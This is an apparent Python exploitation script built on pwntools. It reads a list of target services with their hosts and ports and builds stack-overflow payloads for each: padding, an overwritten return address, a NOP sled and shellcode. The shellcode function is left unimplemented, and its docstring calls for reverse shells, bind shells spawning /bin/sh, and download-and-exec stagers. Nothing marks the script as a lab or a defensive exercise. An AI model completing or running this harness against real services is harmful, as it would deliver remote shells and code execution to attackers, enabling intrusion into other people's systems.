import json
import sys

from pwn import asm, p64, shellcraft, context

from validator import validate_target

context.arch = "amd64"
context.os = "linux"

with open("targets.json") as f:
    data = json.load(f)


def build_shellcode(target_type: str) -> bytes:
    """Generate shellcode for the given exploit target type.

    Supported types:
      - reverse_shell: connect-back shell to attacker host/port
      - bind_shell:    listen on a port and spawn /bin/sh on connect
      - stager:        download + exec second-stage payload

    Must return raw bytes (assembled, null-free).
    """
    raise NotImplementedError(f"build_shellcode('{target_type}') not implemented")


def build_payload(target: dict) -> bytes:
    offset = int(target["buffer_offset"])
    ret_addr = int(target["return_address"], 16)
    sc = build_shellcode(target["shellcode_type"])
    assert len(sc) >= 20, f"Shellcode too short ({len(sc)} bytes), need >= 20"
    assert all(b != 0 for b in sc), "Shellcode contains null bytes"
    nop_sled = asm(shellcraft.nop()) * 16
    return b"A" * offset + p64(ret_addr) + nop_sled + sc


for target in data["services"]:
    validate_target(target)
    try:
        payload = build_payload(target)
        print(f"{target['service_name']} ({target['host']}:{target['port']})")
        print(f"  Offset: {target['buffer_offset']} bytes")
        print(f"  Shellcode type: {target['shellcode_type']}")
        print(f"  Payload size: {len(payload)} bytes")
        print(f"  Vuln: {target['vulnerability_details']}")
        print()
    except NotImplementedError as e:
        print(f"ERROR: {e}", file=sys.stderr)
        sys.exit(1)
